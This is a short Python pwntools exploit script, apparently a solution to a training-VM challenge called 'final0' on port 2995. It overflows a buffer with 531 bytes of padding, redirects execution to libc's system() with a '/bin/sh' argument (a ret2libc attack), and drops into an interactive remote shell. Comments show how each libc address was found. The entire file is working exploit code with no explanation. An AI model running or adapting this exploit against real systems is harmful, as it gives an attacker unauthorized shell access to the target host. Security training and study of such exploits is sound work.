import pwn

host = "192.168.1.251"
port = 2995

r = pwn.remote(host,port)

offset = 531
junk = b"\x00" + b"A" * offset

libc_addr = 0xb7e97000                  # cat /proc/$(pidof final0)/maps
system_addr = libc_addr + 0x00038fb0    # readelf -s /lib/libc-2.11.2.so | grep -i system
exit_addr = libc_addr + 0x0002f0c0      # readelf -s /lib/libc-2.11.2.so | grep -i exit
bin_sh = libc_addr + 0x11f3bf           # strings -atx /lib/libc-2.11.2.so | grep "/bin/sh"

pwn.info("system address: 0x%x" % system_addr)
pwn.info("exit address: 0x%x" % exit_addr)
pwn.info("/bin/sh address: 0x%x" % bin_sh)

payload = junk + pwn.p32(system_addr) + pwn.p32(exit_addr) + pwn.p32(bin_sh)

r.sendline(payload)
r.interactive()
r.close()